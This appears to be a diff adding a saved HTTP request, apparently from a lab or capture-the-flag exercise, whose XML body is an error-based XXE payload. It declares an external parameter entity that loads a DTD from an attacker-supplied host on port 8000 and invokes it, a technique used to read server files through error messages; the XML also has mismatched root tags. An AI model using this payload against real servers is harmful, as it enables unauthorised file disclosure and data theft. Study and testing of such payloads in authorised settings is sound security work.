@@ -1,0 +1,13 @@
+POST /error/submitDetails.php HTTP/1.1
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://<IP>:8000/xxe_error.dtd">
+  %remote;
+  %error;
+]>
+<roo>
+<name>Hello</name>
+<tel>14456</tel>
+<email>&kjkj;</email>
+<message>hahah</message>
+</root>
